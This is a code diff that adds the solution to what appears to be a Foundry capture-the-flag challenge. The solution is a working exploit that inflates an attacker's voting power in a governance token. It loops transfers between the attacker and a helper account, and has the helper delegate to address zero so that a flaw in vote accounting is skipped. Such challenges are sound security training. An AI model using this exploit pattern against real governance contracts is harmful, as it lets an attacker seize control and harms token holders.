@@ -54,6 +54,21 @@ contract Testing is Test {
         /// for this exploit, you can use vm.prank(..) w/ {attacker,o1,o2}
 
         // implement solution here
+        vm.prank(attacker);
+        governanceToken.delegate(attacker);
+        uint256 votes;
+        while(votes <= governanceToken.getCurrentVotes(adminUser)) {
+            vm.prank(attacker);
+            governanceToken.transfer(o1, 500e18);
+            vm.prank(o1);
+            governanceToken.delegate(attacker);
+            vm.prank(o1);
+            governanceToken.transfer(attacker, 500e18);
+            //balanceOf(o1)=0, delegating 0x0 that updates delegatee and skips if block in _moveDelegates 
+            vm.prank(o1);
+            governanceToken.delegate(address(0x0));
+            votes = governanceToken.getCurrentVotes(attacker);        
+        }        
         
         validation();
     }
